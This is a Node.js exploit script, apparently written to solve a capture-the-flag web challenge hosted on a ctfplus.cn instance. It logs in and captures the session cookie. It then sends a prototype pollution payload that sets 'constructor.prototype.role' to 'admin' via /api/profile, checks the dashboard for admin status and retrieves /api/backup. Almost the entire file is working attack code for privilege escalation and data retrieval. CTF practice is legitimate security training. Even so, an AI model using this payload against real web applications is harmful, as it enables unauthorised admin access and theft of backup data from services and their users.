
const http = require('http');
const querystring = require('querystring');

// First login
const postData = querystring.stringify({
  "uid": "9e5861b088a34b9380c789c735366c77"
});

const options = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(postData)
  }
};

const req = http.request(options, (res) => {
  let setCookie = res.headers['set-cookie'];
  let cookie = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';
  console.log("Got cookie, poisoning profile...");
  
  // Poison via /api/profile
  const poisonData = JSON.stringify({
    "uid": "9e5861b088a34b9380c789c735366c77",
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  
  const poisonOptions = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(poisonData),
      'Cookie': cookie
    }
  };
  
  const poisonReq = http.request(poisonOptions, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => {
      console.log("Poison response:", body);
      console.log("\nNow check dashboard again...");
      getPage('/dashboard', cookie, (body) => {
        console.log(body);
        // Check if role is admin
        if (body.includes('tag.admin')) {
          console.log("\nGot admin role! Let's get backup:");
          getPage('/api/backup', cookie, (backup) => {
            console.log("\nBackup:");
            console.log(backup);
          });
        }
      });
    });
  });
  poisonReq.write(poisonData);
  poisonReq.end();
});

req.on('error', err => console.error(err));
req.write(postData);
req.end();

function getPage(path, cookie, callback) {
  const options = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: path,
    method: 'GET',
    headers: {
      'Cookie': cookie
    }
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', chunk => body += chunk);
    res.on('end', () => callback(body));
  });
  req.end();
}
